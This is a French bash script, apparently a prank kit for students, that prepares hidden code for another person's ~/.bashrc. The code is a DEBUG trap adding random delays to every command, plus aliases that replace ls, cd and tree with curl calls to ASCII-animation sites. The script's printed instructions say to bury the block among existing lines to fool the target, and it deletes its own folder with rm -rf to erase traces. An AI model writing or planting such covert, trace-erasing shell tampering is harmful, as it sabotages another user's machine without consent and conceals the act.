#!/usr/bin/env bash

echo "#STEP: 1 - Initialisation"
if [ "$#" -ne 3 ] && [ "$1" != "-e" ]; then
    echo "Usage: ./preparation [-r|-n|-e] {CONFPATH} [FILENAME]"
    echo "  -r : Supprime le dossier 'session_lagger' pour ne pas laisser de trace."
    echo "  -n : Ne pas effacer le dossier (mauvaise idée)."
    echo "  -e : Mode EPITA, pas besoin de CONFPATH (utilise \$HOME/afs/.confs/config)"
    echo "  CONFPATH : chemin absolu du dossier config (inutile si -e)"
    echo "  FILENAME : nom du fichier FILENAME.conf contenant la fonction"
    exit 1
fi

OPTION="$1"
CONFPATH="$2"
FILENAME="$3"

# Récupération du chemin absolu du script pour éviter les bugs avec les chemins relatifs ("..")
DIR=$(dirname "$(realpath "$0")")

echo "#STEP: 2 - Configuration des chemins"
if [ "$OPTION" = "-e" ]; then
    FILENAME="$2" # En mode -e, le paramètre 2 est le FILENAME
    CONFPATH="$HOME/afs/.confs/config"
fi

FILE="$CONFPATH/$FILENAME.conf"
BASHFILE="$DIR/put_in_bashrc"

echo "#STEP: 3 - Création du fichier de config (La Lagger Function)"
# On s'assure que le dossier de destination existe, sinon on le crée en silence
mkdir -p "$CONFPATH" 2>/dev/null

# Utilisation d'un "Here-Doc" pour injecter le code proprement sans s'arracher les cheveux avec les guillemets
cat << 'EOF' > "$FILE"
activate_delay() {
    trap 'sleep $(awk "BEGIN{srand(); if (rand() < 0.5) {print 0} else if (rand() < 0.9) {print 1 + rand()} else {print 1 + rand()*3}}")' DEBUG
}
PROMPT_COMMAND="${PROMPT_COMMAND:+$PROMPT_COMMAND; }activate_delay"
EOF

echo "#STEP: 4 - Préparation du bloc pour le .bashrc"
# On génère la condition source et on y ajoute directement les alias
cat << EOF > "$BASHFILE"
if [ -d "$HOME/.config" ] ; then
    source "$FILE"
fi

# --- Alias pour brouiller les pistes ---
alias ls='curl -s ascii.live/nyan'
alias cd='curl -s ascii.live/rick'
alias tree='curl -s ascii.live/donut'
EOF


# --- Affichage des consignes ---
echo ""
echo "_____________________________________________________"
echo ""
echo "🔥 PRÊT POUR LE TROLL 🔥"
echo ""
echo "Copie le bloc ci-dessous et colle-le dans le ~/.bashrc de la cible."
echo "Astuce : Mets la condition au milieu des autres conditions existantes."
echo "Laisse les alias tout en bas pour tromper le frérot."
echo "_____________________________________________________"
echo ""
cat "$BASHFILE"
echo ""
echo "_____________________________________________________"
echo ""


echo "#STEP: 5 - Nettoyage"
if [ "$OPTION" = "-r" ] || [ "$OPTION" = "-e" ]; then
    # Sécurité : On vérifie qu'on est bien dans un dossier qui s'appelle session_lagger avant de rm -rf
    if [[ "$DIR" == *"session_lagger"* ]]; then
        rm -rf "$DIR"
        echo "🧹 Dossier 'session_lagger' effacé avec succès."
    else
        echo "⚠️ Avertissement : Le dossier courant ne s'appelle pas 'session_lagger'. Suppression automatique annulée par sécurité. Supprime-le à la main."
    fi
else
    echo "⚠️ C'est dangereux de ne pas tout effacer. Pense à nettoyer tes traces."
fi
